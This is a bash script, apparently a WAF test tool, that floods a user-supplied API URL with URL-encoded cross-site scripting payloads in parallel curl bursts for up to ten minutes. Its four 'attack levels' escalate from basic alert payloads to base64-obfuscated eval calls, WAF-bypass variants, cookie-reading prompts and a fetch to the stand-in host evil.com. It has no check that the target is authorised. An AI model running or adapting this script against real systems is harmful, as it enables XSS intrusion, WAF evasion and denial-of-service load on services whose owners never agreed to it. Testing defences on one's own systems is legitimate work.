#!/bin/bash

read -p "Enter the base API URL (e.g., https://example.execute-api.us-east-1.amazonaws.com/prod): " BASE_URL

# Validate base URL not empty
if [ -z "$BASE_URL" ]; then
  echo "Base URL cannot be empty."
  exit 1
fi

while true; do
  read -p "Enter test duration in minutes (1–10): " DURATION_MIN
  if [[ "$DURATION_MIN" =~ ^[0-9]+$ ]] && [ "$DURATION_MIN" -ge 1 ] && [ "$DURATION_MIN" -le 10 ]; then
    break
  else
    echo "Please enter a number between 1 and 10."
  fi
done

while true; do
  echo "Select attack level:"
  echo "  1) Medium    — Basic XSS payloads, moderate traffic"
  echo "  2) High      — Advanced payloads, increased traffic"
  echo "  3) Critical  — Evasive, maximum burst, WAF bypass attempts"
  echo "  4) ATOMIC    — Maximum obfuscation, hyper-aggressive, triggers urgent WAF response"
  read -p "Enter 1, 2, 3, or 4: " LEVEL
  case $LEVEL in
    1)
      PAYLOADS=(
        "%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E"
        "%3Csvg%20onload%3Dalert(1)%3E"
        "%3Cscript%3Ealert(1)%3C%2Fscript%3E"
      )
      BURST=5
      break
      ;;
    2)
      PAYLOADS=(
        "%3Ciframe%20srcdoc%3D%27%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E%27%3E%3C%2Fiframe%3E"
        "%3Cimg%20src%3Dx%20onerror%3Dprompt(document.cookie)%3E"
        "%3Cvideo%20src%3Dx%20onerror%3Deval(atob('YWxlcnQoJ0hpZ2hMZXZlbCcp'))%3E"
        "%3Clayer%20src%3Dx%20onmouseover%3Dconfirm('HighLevel')%3E"
        "%3Cmath%20href%3Djavascript:alert(2)%3E"
      )
      BURST=10
      break
      ;;
    3)
      PAYLOADS=(
        "%3Cmeta%20http-equiv%3Drefresh%20content%3D1;url%3Djavascript:alert('XSS')%3E"
        "%3Cobject%20data%3Djavascript:alert('Critical')%3E"
        "%3Cform%20action%3Djavascript:alert('CriticalXSS')%3E"
        "'%3Cimg%20src%3Dx%20onerror%3Deval(atob(\'YWxlcnQoJ0NyaXRpY2FsQ3NzJyk=\'))%3E'"
        "%3Clink%20rel%3Dstylesheet%20href%3Djavascript:alert(document.domain)%3E"
        "%3Cinput%20onfocus%3Dalert('CriticalFocus')%3E"
        "%3Csvg%2Fonload%3Deval(atob(\'YWxlcnQoJ0NyaXRpY2FsQ3NzJyk=\'))%3E"
      )
      BURST=20
      break
      ;;
    4)
      PAYLOADS=(
        "%3Ciframe%20srcdoc%3D%27%3Cinput%20onfocus%3Deval(atob('YWxlcnQoJ0FUT01JQycp'))%3E%3Cscript%3Ewindow.location%3D%27javascript%3Aalert(%5C%27ATOMIC%5C%27)%27%3C%2Fscript%3E%27%3E%3C%2Fiframe%3E"
        "%3Cimg%20src%3Dx%20onerror%3Deval(atob('dmFyIGEgPSBvbihhdG9tSWMoJykpOwogYWxlcnQoJ0FUT01JQycpOw=='))%3E"
        "%3Cinput%20autofocus%20onfocus%3Dfetch('https%3A%2F%2Fevil.com%2Fxss%3Fp%3DATOMIC')%3E"
        "%3Cform%20onsubmit%3DsetTimeout(()%3D%3Ealert('ATOMIC'),1)%3E"
        "%3Cmath%20href%3Djavascript%3Ae%3Dwindow%3Balert('ATOMIC')%3E"
        "%3Csvg%20onload%3Dwindow%5B'at'%20+%20'om'%20+%20'ic'%5D(42)%3E"
        "%3Clink%20href%3Djavascript%3Aalert('ATOMIC-LEVEL-XSS')%3E"
        "%3Cmeta%20http-equiv%3Drefresh%20content%3D0;url%3Djavascript:alert('ATOMIC')%3E"
      )
      BURST=50
      break
      ;;
    *)
      echo "Please enter 1, 2, 3, or 4."
      ;;
  esac
done

START_TIME=$(date +%s)
END_TIME=$((START_TIME + DURATION_MIN * 60))
COUNT=0

echo "Starting simulated XSS test level $LEVEL (running for $DURATION_MIN minute(s))..."
echo "Logs will show each hit, payload used, and timestamp."

while [ "$(date +%s)" -lt "$END_TIME" ]; do
  for i in $(seq 1 $BURST); do
    for PAYLOAD in "${PAYLOADS[@]}"; do
      FULL_URL="${BASE_URL}?name=${PAYLOAD}"
      TIMESTAMP=$(date '+%Y-%m-%d %H:%M:%S')
      echo "[${TIMESTAMP}] Sending payload $((COUNT+1)): $FULL_URL"
      curl -sk --max-time 5 "$FULL_URL" > /dev/null &
      ((COUNT++))
    done
  done
  wait
  sleep 1
  REMAIN_SECS=$((END_TIME - $(date +%s)))
  if [ "$REMAIN_SECS" -le 0 ]; then break; fi
  REMAIN_MIN=$((REMAIN_SECS/60))
  REMAIN_SEC=$((REMAIN_SECS%60))
  echo "---- Progress: $COUNT requests sent; Time left: ${REMAIN_MIN}m ${REMAIN_SEC}s ----"
done

echo "Test completed. Total payloads sent: $COUNT"
